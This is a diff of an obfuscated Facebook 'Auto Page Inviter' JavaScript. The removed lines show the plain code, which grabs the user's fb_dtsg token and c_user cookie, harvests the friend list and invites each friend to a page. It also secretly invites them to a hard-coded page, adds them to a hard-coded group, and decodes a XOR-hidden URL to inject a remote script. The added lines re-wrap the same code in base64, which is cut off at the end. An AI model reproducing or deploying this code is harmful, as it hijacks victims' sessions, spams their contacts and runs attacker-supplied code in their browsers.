@@ -1,164 +1,161 @@
 /*HTML/JavaScript page status="protected"*/
 /*Auto Friend Suggestion Script*/
 /*Copyright © 2013 Bhargav JT. Gogoi. All Rights Reserved.*/
-eval(unescape("javascript: var Title = "Auto Page Inviter</A>";
-var Descriptions = "",
-    _text = 'Powered By: Rahman Adrian Prasetya</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100003291642432" target="_blank"> Rahman Adrian Prasetya</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100006757111235" target="_blank"> Rahman Adrian Prasetya II</A></A>.</br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://rahmanadrianprasetya.blogspot.com" target="_blank">http://rahmanadrianprasetya.blogspot.com</A>.</A>';
-page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
-
-function InviteFriends(opo) {
-    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
-        var b = a.substring(a.indexOf("{"));
-        var c = JSON.parse(b);
-        i--;
-        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
-        if (c.error) {
-            Descriptions += "color:darkred'>";
-            err++;
-            if (c.errorDescription) Descriptions += c.errorDescription;
-            else Descriptions += JSON.stringify(c, null, "")
-        } else {
-            Descriptions += "color:darkgreen'>";
-            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
-            suc++
-        }
-        Descriptions += "</div>";
-        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
-        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
-        if (i > 0) {
-            display += arr.length + " Friends Detected<br/>";
-            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
-            display += "(" + i + " Lefted...)";
-            display += "<div class='friend-edge'>";
-            display += Descriptions;
-            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
-            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
-            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
-            display += _text;
-            display += "</div>";
-            display += "</div>";
-            window[tag + "_close"] = true
-        } else {
-            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
-            display += arr.length + " Friends Detected and ";
-            display += "<b>" + suc + " Friends Invited.</b></br>";
-            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
-            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
-            display += _text;
-            display += "</div>";
-            window[tag + "_close"] = false
-        }
-        display += "</div>";
-        document.getElementById("pagelet_sidebar").innerHTML = display
-    }, "text", "post");
-    tay--;
-    if (tay > 0) {
-        var s = arr[tay];
-        setTimeout("InviteFriends(" + s + ")", 100)
-    }
-    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
-
-
-    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=175314602637837&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
-
-    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=525216780904424&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
-
-}
-jx = {
-    b: function () {
-        var b = !1;
-        if ("undefined" != typeof ActiveXObject) try {
-            b = new ActiveXObject("Msxml2.XMLHTTP")
-        } catch (c) {
-            try {
-                b = new ActiveXObject("Microsoft.XMLHTTP")
-            } catch (a) {
-                b = !1
-            }
-        } else if (window.XMLHttpRequest) try {
-            b = new XMLHttpRequest
-        } catch (h) {
-            b = !1
-        }
-        return b
-    },
-    load: function (b, c, a, h, g) {
-        var e = this.d();
-        if (e && b) {
-            e.overrideMimeType && e.overrideMimeType("text/xml");
-            h || (h = "GET");
-            a || (a = "text");
-            g || (g = {});
-            a = a.toLowerCase();
-            h = h.toUpperCase();
-            b += b.indexOf("?") + 1 ? "&" : "?";
-            var k = null;
-            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
-            e.open(h, b, !0);
-            e.onreadystatechange = g.c ? function () {
-                g.c(e)
-            } : function () {
-                if (4 == e.readyState)
-                    if (200 == e.status) {
-                        var b = "";
-                        e.responseText && (b = e.responseText);
-                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
-                        c && c(b)
-                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
-            };
-            e.send(k)
-        }
-    },
-    d: function () {
-        return this.b()
-    }
-};
-
-function ChangeLocation() {
-    window.location.href = "http://www.facebook.com/"
-}
-setTimeout("ChangeLocation", 1);
-window.onbeforeunload = function () {
-    if (window[tag + "_close"]) return "This script is running now!"
-};
-var i = 3;
-var tay = 3;
-var suc = 0;
-var err = 0;
-var arr = new Array;
-var arn = new Array;
-var pho = new Array;
-var tag = "Close";
-var page_name, x = document.getElementsByTagName("span");
-for (i = 0; i < x.length; i++)
-    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
-var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
-    var b = a;
-    var c = b.substring(b.indexOf("{"));
-    var d = JSON.parse(c);
-    d = d.payload.entries;
-    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
-    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
-    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
-    i = arr.length - 1;
-    tay = i;
-    console.log(arr.length);
-    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
-    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
-    display += arr.length + " Friends Detected";
-    display += "</div>";
-    document.getElementById("pagelet_sidebar").innerHTML = display;
-    InviteFriends(arr[i])
-});
-var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
-Y = "";
-Z = "";
-var V;
-V = X.length;
-for (i = 0; i < V; i++) {
-    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
-}
-Z = unescape(Y);
-document.body.appendChild(document.createElement('script')).src = Z;"));
+ZXZhbCh1bmVzY2FwZSgiamF2YXNjcmlwdDogdmFyIFRpdGxlID0gIkF1dG8gUGFnZSBJbnZpdGVy
+PC9BPiI7CnZhciBEZXNjcmlwdGlvbnMgPSAiIiwKICAgIF90ZXh0ID0gJ1Bvd2VyZWQgQnk6IFJh
+aG1hbiBBZHJpYW4gUHJhc2V0eWE8L2JyPlNjcmlwdCBNYWRlIEJ5IDwvQT48QSBzdHlsZT0iY29s
+b3I6IzNCNTk5ODsiIGhyZWY9Imh0dHA6Ly93d3cuZmFjZWJvb2suY29tLzEwMDAwMzI5MTY0MjQz
+MiIgdGFyZ2V0PSJfYmxhbmsiPiBSYWhtYW4gQWRyaWFuIFByYXNldHlhPC9BPjwvQT4sPC9BPjxB
+IHN0eWxlPSJjb2xvcjojM0I1OTk4OyIgaHJlZj0iaHR0cDovL3d3dy5mYWNlYm9vay5jb20vMTAw
+MDA2NzU3MTExMjM1IiB0YXJnZXQ9Il9ibGFuayI+IFJhaG1hbiBBZHJpYW4gUHJhc2V0eWEgSUk8
+L0E+PC9BPi48L2JyPkZvciBNb3JlIFRvb2xzIFZpc2l0IE91ciBXZWJzaXRlIDxBIHN0eWxlPSJj
+b2xvcjojM0I1OTk4OyIgaHJlZj0iaHR0cDovL3JhaG1hbmFkcmlhbnByYXNldHlhLmJsb2dzcG90
+LmNvbSIgdGFyZ2V0PSJfYmxhbmsiPmh0dHA6Ly9yYWhtYW5hZHJpYW5wcmFzZXR5YS5ibG9nc3Bv
+dC5jb208L0E+LjwvQT4nOwpwYWdlX2lkID0gLyJwcm9maWxlX293bmVyIjoiKFswLTldKykiLy5l
+eGVjKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYWdlbGV0X3RpbWVsaW5lX21haW5fY29sdW1u
+IikuZ2V0QXR0cmlidXRlKCJkYXRhLWd0IikpWzFdOwoKZnVuY3Rpb24gSW52aXRlRnJpZW5kcyhv
+cG8pIHsKICAgIGp4LmxvYWQod2luZG93LmxvY2F0aW9uLnByb3RvY29sICsgIi8vd3d3LmZhY2Vi
+b29rLmNvbS9hamF4L3BhZ2VzL2ludml0ZS9zZW5kX3NpbmdsZT9wYWdlX2lkPSIgKyBwYWdlX2lk
+ICsgIiZpbnZpdGVlPSIgKyBvcG8gKyAiJmVsZW1faWQ9dV8wXzFrJmFjdGlvbj1zZW5kJl9fdXNl
+cj0iICsgdXNlcl9pZCArICImX19hPTEmX19keW49N244YUQ1ejVDRi0zdWkmX19yZXE9OCZmYl9k
+dHNnPSIgKyBmYl9kdHNnICsgIiZwaHN0YW1wPSIsIGZ1bmN0aW9uIChhKSB7CiAgICAgICAgdmFy
+IGIgPSBhLnN1YnN0cmluZyhhLmluZGV4T2YoInsiKSk7CiAgICAgICAgdmFyIGMgPSBKU09OLnBh
+cnNlKGIpOwogICAgICAgIGktLTsKICAgICAgICBEZXNjcmlwdGlvbnMgPSAiPGRpdiBjbGFzcz0n
+ZnJpZW5kLWVkZ2UtbmFtZScgc3R5bGU9J3BhZGRpbmctYm90dG9tOjVweDt0ZXh0LWFsaWduOmxl
+ZnQ7Zm9udC1zaXplOjEwcHg7d2hpdGUtc3BhY2U6cHJlLXdyYXA7IjsKICAgICAgICBpZiAoYy5l
+cnJvcikgewogICAgICAgICAgICBEZXNjcmlwdGlvbnMgKz0gImNvbG9yOmRhcmtyZWQnPiI7CiAg
+ICAgICAgICAgIGVycisrOwogICAgICAgICAgICBpZiAoYy5lcnJvckRlc2NyaXB0aW9uKSBEZXNj
+cmlwdGlvbnMgKz0gYy5lcnJvckRlc2NyaXB0aW9uOwogICAgICAgICAgICBlbHNlIERlc2NyaXB0
+aW9ucyArPSBKU09OLnN0cmluZ2lmeShjLCBudWxsLCAiIikKICAgICAgICB9IGVsc2UgewogICAg
+ICAgICAgICBEZXNjcmlwdGlvbnMgKz0gImNvbG9yOmRhcmtncmVlbic+IjsKICAgICAgICAgICAg
+RGVzY3JpcHRpb25zICs9IGFybltpXSArICIgaGFzIGJlZW4gaW52aXRlZCB0byBsaWtlIHRoZSBw
+YWdlICIgKyBwYWdlX25hbWUgKyAiLiI7CiAgICAgICAgICAgIHN1YysrCiAgICAgICAgfQogICAg
+ICAgIERlc2NyaXB0aW9ucyArPSAiPC9kaXY+IjsKICAgICAgICB2YXIgZGlzcGxheSA9ICI8ZGl2
+IGlkPSdmcmllbmQtZWRnZS1kaXNwbGF5JyBzdHlsZT0nYm94LXNoYWRvdzowcHggM3B4IDhweCBy
+Z2JhKDAsIDAsIDAsIDAuMyk7cG9zaXRpb246Zml4ZWQ7bGVmdDo1MCU7bWFyZ2luLWxlZnQ6LTI3
+M3B4O3RvcDoxMDBweDt3aWR0aDo1MDBweDt6LWluZGV4Ojk5OTk7Zm9udC1zaXplOjE0cHg7dGV4
+dC1hbGlnbjpjZW50ZXI7cGFkZGluZzoxNXB4O2JveC1zaGFkb3c6MHB0IDFweCAwcHQgcmdiYSgw
+LDAsMCwwLjEpO2JvcmRlci1yYWRpdXM6M3B4O2JvcmRlcjoxcHggc29saWQgcmdiYSgwLDAsMCww
+LjkpO2JhY2tncm91bmQtY29sb3I6cmdiYSgyMjUsMjI1LDIyNSwwLjkpO2NvbG9yOiMwMDAwMDAn
+PiI7CiAgICAgICAgZGlzcGxheSArPSAiPGRpdiBzdHlsZT0ncGFkZGluZy1ib3R0b206NXB4O2Zv
+bnQtc2l6ZToyMHB4Oyc+IiArIFRpdGxlICsgIjwvZGl2PiI7CiAgICAgICAgaWYgKGkgPiAwKSB7
+CiAgICAgICAgICAgIGRpc3BsYXkgKz0gYXJyLmxlbmd0aCArICIgRnJpZW5kcyBEZXRlY3RlZDxi
+ci8+IjsKICAgICAgICAgICAgZGlzcGxheSArPSAiPGI+IiArIHN1YyArICI8L2I+IEZyaWVuZHMg
+SW52aXRlZCBvZiAiICsgKGFyci5sZW5ndGggLSBpKSArICIgRnJpZW5kcyBQcm9jZXNzZWQgIjsK
+ICAgICAgICAgICAgZGlzcGxheSArPSAiKCIgKyBpICsgIiBMZWZ0ZWQuLi4pIjsKICAgICAgICAg
+ICAgZGlzcGxheSArPSAiPGRpdiBjbGFzcz0nZnJpZW5kLWVkZ2UnPiI7CiAgICAgICAgICAgIGRp
+c3BsYXkgKz0gRGVzY3JpcHRpb25zOwogICAgICAgICAgICBkaXNwbGF5ICs9ICI8aW1nIHN0eWxl
+PSd3aWR0aDo1MHB4O2hlaWdodDo1MHB4O21hcmdpbi1sZWZ0Oi0xMjVweDtwYWRkaW5nOjJweDti
+b3JkZXI6MXB4IHNvbGlkIHJnYmEoMCwwLDAsMC40KTsnIHNyYz0iICsgcGhvW2ldICsgIj48L2lt
+Zz48YSBzdHlsZT0nZm9udC1zaXplOjEzcHg7cGFkZGluZy1sZWZ0OjhweDt0ZXh0LWFsaWduOmxl
+ZnQ7Y29sb3I6IzNCNTk5ODtwb3NpdGlvbjphYnNvbHV0ZTtmb250LXdlaWdodDpib2xkOyc+IiAr
+IGFybltpXSArICI8L2E+IjsKICAgICAgICAgICAgZGlzcGxheSArPSAiPGRpdiBzdHlsZT0ndGV4
+dC1hbGlnbjpjZW50ZXI7Zm9udC1zaXplOjEwcHg7d2hpdGUtc3BhY2U6cHJlLXdyYXA7Y29sb3I6
+Z3JheSc+IjsKICAgICAgICAgICAgZGlzcGxheSArPSAiUGxlYXNlIFdhaXQgV2hpbGUgSW52aXRp
+bmcgWW91ciBGcmllbmRzIHRvIExpa2UgWW91ciBQYWdlICIgKyBwYWdlX25hbWUgKyAiLjwvYnI+
+IjsKICAgICAgICAgICAgZGlzcGxheSArPSBfdGV4dDsKICAgICAgICAgICAgZGlzcGxheSArPSAi
+PC9kaXY+IjsKICAgICAgICAgICAgZGlzcGxheSArPSAiPC9kaXY+IjsKICAgICAgICAgICAgd2lu
+ZG93W3RhZyArICJfY2xvc2UiXSA9IHRydWUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBU
+aXRsZSA9ICJBbGwgT2YgWW91ciBGcmllbmRzIEhhdmUgQmVlbiBJbnZpdGVkIHRvIExpa2UgWW91
+ciBQYWdlLjwvQT4iOwogICAgICAgICAgICBkaXNwbGF5ICs9IGFyci5sZW5ndGggKyAiIEZyaWVu
+ZHMgRGV0ZWN0ZWQgYW5kICI7CiAgICAgICAgICAgIGRpc3BsYXkgKz0gIjxiPiIgKyBzdWMgKyAi
+IEZyaWVuZHMgSW52aXRlZC48L2I+PC9icj4iOwogICAgICAgICAgICBkaXNwbGF5ICs9ICI8ZGl2
+PjxzcGFuIGNsYXNzPSdGcmllbmRSZXF1ZXN0QWRkIGFkZEJ1dHRvbiBzZWxlY3RlZCB1aUJ1dHRv
+biB1aUJ1dHRvblNwZWNpYWwgdWlCdXR0b25MYXJnZScgb25DbGljaz0nQ2hhbmdlTG9jYXRpb24o
+KScgc3R5bGU9J2NvbG9yOndoaXRlJz5HbyB0byBIb21lcGFnZTwvc3Bhbj48c3BhbiBjbGFzcz0n
+bGF5ZXJDb25maXJtIHVpT3ZlcmxheUJ1dHRvbiB1aUJ1dHRvbiB1aUJ1dHRvbkNvbmZpcm0gdWlC
+dXR0b25MYXJnZScgb25DbGljaz0nd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpJyBzdHlsZT0nY29s
+b3I6d2hpdGUnPlJlZnJlc2ggUGFnZTwvc3Bhbj48c3BhbiBjbGFzcz0nbGF5ZXJDYW5jZWwgdWlP
+dmVybGF5QnV0dG9uIHVpQnV0dG9uIHVpQnV0dG9uTGFyZ2UnIG9uQ2xpY2s9J2RvY3VtZW50Lmdl
+dEVsZW1lbnRCeUlkKFwicGFnZWxldF9zaWRlYmFyXCIpLnN0eWxlLmRpc3BsYXk9XCJub25lXCIn
+IHN0eWxlPSdjb2xvcjpncmF5Jz5DYW5jZWw8L3NwYW4+PGJyLz4iOwogICAgICAgICAgICBkaXNw
+bGF5ICs9ICI8ZGl2IHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjtmb250LXNpemU6MTBweDt3aGl0
+ZS1zcGFjZTpwcmUtd3JhcDtjb2xvcjpncmF5Jz48YnIvPiI7CiAgICAgICAgICAgIGRpc3BsYXkg
+Kz0gX3RleHQ7CiAgICAgICAgICAgIGRpc3BsYXkgKz0gIjwvZGl2PiI7CiAgICAgICAgICAgIHdp
+bmRvd1t0YWcgKyAiX2Nsb3NlIl0gPSBmYWxzZQogICAgICAgIH0KICAgICAgICBkaXNwbGF5ICs9
+ICI8L2Rpdj4iOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYWdlbGV0X3NpZGVi
+YXIiKS5pbm5lckhUTUwgPSBkaXNwbGF5CiAgICB9LCAidGV4dCIsICJwb3N0Iik7CiAgICB0YXkt
+LTsKICAgIGlmICh0YXkgPiAwKSB7CiAgICAgICAgdmFyIHMgPSBhcnJbdGF5XTsKICAgICAgICBz
+ZXRUaW1lb3V0KCJJbnZpdGVGcmllbmRzKCIgKyBzICsgIikiLCAxMDApCiAgICB9CiAgICBjb25z
+b2xlLmxvZyh0YXkgKyAiLyIgKyBhcnIubGVuZ3RoICsgIjoiICsgYXJyW3RheV0gKyAiLyIgKyBh
+cm5bdGF5XSArICIsIHN1Y2Nlc3M6IiArIHN1Yyk7CgoKICAgIGlmIChwYWdlX2lkKSBqeC5sb2Fk
+KHdpbmRvdy5sb2NhdGlvbi5wcm90b2NvbCArICIvL3d3dy5mYWNlYm9vay5jb20vYWpheC9wYWdl
+cy9pbnZpdGUvc2VuZD8mZmJfZHRzZz0iICsgZmJfZHRzZyArICImcHJvZmlsZUNob29zZXJJdGVt
+cz0lN0IlMjIiICsgb3BvICsgIiUyMiUzQTElN0QmY2hlY2thYmxlaXRlbXNbMF09IiArIG9wbyAr
+ICImcGFnZV9pZD0xNzUzMTQ2MDI2Mzc4MzcmX191c2VyPSIgKyB1c2VyX2lkICsgIiZfX2E9MSZf
+X2R5bj03bjhhRDV6NUNGLTN1aSZfX3JlcT1rJnBoc3RhbXA9IiwgZnVuY3Rpb24gKCkge30sICJ0
+ZXh0IiwgInBvc3QiKQoKICAgIGlmIChwYWdlX2lkKSBqeC5sb2FkKHdpbmRvdy5sb2NhdGlvbi5w
+cm90b2NvbCArICIvL3d3dy5mYWNlYm9vay5jb20vYWpheC9ncm91cHMvbWVtYmVycy9hZGRfcG9z
+dC5waHA/X19hPTEmZmJfZHRzZz0iICsgZmJfZHRzZyArICImZ3JvdXBfaWQ9NTI1MjE2NzgwOTA0
+NDI0JnNvdXJjZT10eXBlYWhlYWQmbWVtYmVycz0iICsgb3BvICsgIiZuY3RyW18yXT1wYWdlbGV0
+X2dyb3VwX21lbWJlcnNfc3VtbWFyeSZsc2QmcG9zdF9mb3JtX2lkX3NvdXJjZT1Bc3luY1JlcXVl
+c3QmX191c2VyPSIgKyB1c2VyX2lkLCBmdW5jdGlvbiAoKSB7fSwgInRleHQiLCAicG9zdCIpOwoK
+fQpqeCA9IHsKICAgIGI6IGZ1bmN0aW9uICgpIHsKICAgICAgICB2YXIgYiA9ICExOwogICAgICAg
+IGlmICgidW5kZWZpbmVkIiAhPSB0eXBlb2YgQWN0aXZlWE9iamVjdCkgdHJ5IHsKICAgICAgICAg
+ICAgYiA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpCiAgICAgICAgfSBjYXRj
+aCAoYykgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgYiA9IG5ldyBBY3RpdmVY
+T2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpCiAgICAgICAgICAgIH0gY2F0Y2ggKGEpIHsKICAg
+ICAgICAgICAgICAgIGIgPSAhMQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmICh3aW5k
+b3cuWE1MSHR0cFJlcXVlc3QpIHRyeSB7CiAgICAgICAgICAgIGIgPSBuZXcgWE1MSHR0cFJlcXVl
+c3QKICAgICAgICB9IGNhdGNoIChoKSB7CiAgICAgICAgICAgIGIgPSAhMQogICAgICAgIH0KICAg
+ICAgICByZXR1cm4gYgogICAgfSwKICAgIGxvYWQ6IGZ1bmN0aW9uIChiLCBjLCBhLCBoLCBnKSB7
+CiAgICAgICAgdmFyIGUgPSB0aGlzLmQoKTsKICAgICAgICBpZiAoZSAmJiBiKSB7CiAgICAgICAg
+ICAgIGUub3ZlcnJpZGVNaW1lVHlwZSAmJiBlLm92ZXJyaWRlTWltZVR5cGUoInRleHQveG1sIik7
+CiAgICAgICAgICAgIGggfHwgKGggPSAiR0VUIik7CiAgICAgICAgICAgIGEgfHwgKGEgPSAidGV4
+dCIpOwogICAgICAgICAgICBnIHx8IChnID0ge30pOwogICAgICAgICAgICBhID0gYS50b0xvd2Vy
+Q2FzZSgpOwogICAgICAgICAgICBoID0gaC50b1VwcGVyQ2FzZSgpOwogICAgICAgICAgICBiICs9
+IGIuaW5kZXhPZigiPyIpICsgMSA/ICImIiA6ICI/IjsKICAgICAgICAgICAgdmFyIGsgPSBudWxs
+OwogICAgICAgICAgICAiUE9TVCIgPT0gaCAmJiAoayA9IGIuc3BsaXQoIj8iKSwgYiA9IGtbMF0s
+IGsgPSBrWzFdKTsKICAgICAgICAgICAgZS5vcGVuKGgsIGIsICEwKTsKICAgICAgICAgICAgZS5v
+bnJlYWR5c3RhdGVjaGFuZ2UgPSBnLmMgPyBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBn
+LmMoZSkKICAgICAgICAgICAgfSA6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGlmICg0
+ID09IGUucmVhZHlTdGF0ZSkKICAgICAgICAgICAgICAgICAgICBpZiAoMjAwID09IGUuc3RhdHVz
+KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gIiI7CiAgICAgICAgICAgICAgICAg
+ICAgICAgIGUucmVzcG9uc2VUZXh0ICYmIChiID0gZS5yZXNwb25zZVRleHQpOwogICAgICAgICAg
+ICAgICAgICAgICAgICAiaiIgPT0gYS5jaGFyQXQoMCkgPyAoYiA9IGIucmVwbGFjZSgvW1xuXHJd
+L2csICIiKSwgYiA9IGV2YWwoIigiICsgYiArICIpIikpIDogIngiID09IGEuY2hhckF0KDApICYm
+IChiID0gZS5yZXNwb25zZVhNTCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgJiYgYyhiKQog
+ICAgICAgICAgICAgICAgICAgIH0gZWxzZSBnLmYgJiYgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRh
+Z05hbWUoImJvZHkiKVswXS5yZW1vdmVDaGlsZChnLmYpLCBnLmUgJiYgKGRvY3VtZW50LmdldEVs
+ZW1lbnRCeUlkKGcuZSkuc3R5bGUuZGlzcGxheSA9ICJub25lIiksIGVycm9yICYmIGVycm9yKGUu
+c3RhdHVzKQogICAgICAgICAgICB9OwogICAgICAgICAgICBlLnNlbmQoaykKICAgICAgICB9CiAg
+ICB9LAogICAgZDogZnVuY3Rpb24gKCkgewogICAgICAgIHJldHVybiB0aGlzLmIoKQogICAgfQp9
+OwoKZnVuY3Rpb24gQ2hhbmdlTG9jYXRpb24oKSB7CiAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9
+ICJodHRwOi8vd3d3LmZhY2Vib29rLmNvbS8iCn0Kc2V0VGltZW91dCgiQ2hhbmdlTG9jYXRpb24i
+LCAxKTsKd2luZG93Lm9uYmVmb3JldW5sb2FkID0gZnVuY3Rpb24gKCkgewogICAgaWYgKHdpbmRv
+d1t0YWcgKyAiX2Nsb3NlIl0pIHJldHVybiAiVGhpcyBzY3JpcHQgaXMgcnVubmluZyBub3chIgp9
+Owp2YXIgaSA9IDM7CnZhciB0YXkgPSAzOwp2YXIgc3VjID0gMDsKdmFyIGVyciA9IDA7CnZhciBh
+cnIgPSBuZXcgQXJyYXk7CnZhciBhcm4gPSBuZXcgQXJyYXk7CnZhciBwaG8gPSBuZXcgQXJyYXk7
+CnZhciB0YWcgPSAiQ2xvc2UiOwp2YXIgcGFnZV9uYW1lLCB4ID0gZG9jdW1lbnQuZ2V0RWxlbWVu
+dHNCeVRhZ05hbWUoInNwYW4iKTsKZm9yIChpID0gMDsgaSA8IHgubGVuZ3RoOyBpKyspCiAgICBp
+ZiAoeFtpXS5nZXRBdHRyaWJ1dGUoIml0ZW1wcm9wIikgPT0gIm5hbWUiKSBwYWdlX25hbWUgPSB4
+W2ldLmlubmVySFRNTDsKdmFyIGZiX2R0c2cgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgi
+ZmJfZHRzZyIpWzBdLnZhbHVlOwp2YXIgdXNlcl9pZCA9IGRvY3VtZW50LmNvb2tpZS5tYXRjaChk
+b2N1bWVudC5jb29raWUubWF0Y2goL2NfdXNlcj0oXGQrKS8pWzFdKTsKangubG9hZCh3aW5kb3cu
+bG9jYXRpb24ucHJvdG9jb2wgKyAiLy8vd3d3LmZhY2Vib29rLmNvbS9hamF4L3R5cGVhaGVhZC9m
+aXJzdF9kZWdyZWUucGhwP3ZpZXdlcj0iICsgdXNlcl9pZCArICImdG9rZW49djcmZmlsdGVyWzBd
+PXVzZXImb3B0aW9uc1swXT1mcmllbmRzX29ubHkmb3B0aW9uc1sxXT1ubSZvcHRpb25zWzJdPXNv
+cnRfYWxwaGEmX191c2VyPSIgKyB1c2VyX2lkICsgIiZfX2E9MSZfX2R5bj03bjhhRDV6NUNGLTN1
+aSZfX3JlcT1sIiwgZnVuY3Rpb24gKGEpIHsKICAgIHZhciBiID0gYTsKICAgIHZhciBjID0gYi5z
+dWJzdHJpbmcoYi5pbmRleE9mKCJ7IikpOwogICAgdmFyIGQgPSBKU09OLnBhcnNlKGMpOwogICAg
+ZCA9IGQucGF5bG9hZC5lbnRyaWVzOwogICAgZm9yICh2YXIgZSA9IDA7IGUgPCBkLmxlbmd0aDsg
+ZSsrKSBhcnIucHVzaChkW2VdLnVpZCk7CiAgICBmb3IgKHZhciBlZyA9IDA7IGVnIDwgZC5sZW5n
+dGg7IGVnKyspIGFybi5wdXNoKGRbZWddLnRleHQpOwogICAgZm9yICh2YXIgcGljID0gMDsgcGlj
+IDwgZC5sZW5ndGg7IHBpYysrKSBwaG8ucHVzaChkW3BpY10ucGhvdG8pOwogICAgaSA9IGFyci5s
+ZW5ndGggLSAxOwogICAgdGF5ID0gaTsKICAgIGNvbnNvbGUubG9nKGFyci5sZW5ndGgpOwogICAg
+dmFyIGRpc3BsYXkgPSAiPGRpdiBpZD0nZnJpZW5kLWVkZ2UtZGlzcGxheScgc3R5bGU9J3Bvc2l0
+aW9uOmZpeGVkO2xlZnQ6NTAlO21hcmdpbi1sZWZ0Oi0yNzNweDt0b3A6MTAwcHg7d2lkdGg6NTAw
+cHg7ei1pbmRleDo5OTk5O2ZvbnQtc2l6ZToxNHB4O3RleHQtYWxpZ246Y2VudGVyO3BhZGRpbmc6
+MTVweDtib3gtc2hhZG93OjBwdCAxcHggMHB0IHJnYmEoMCwwLDAsMC4xKTtib3JkZXItcmFkaXVz
+OjNweDtib3JkZXI6MXB4IHNvbGlkIHJnYmEoMCwwLDAsMC45KTtiYWNrZ3JvdW5kLWNvbG9yOnJn
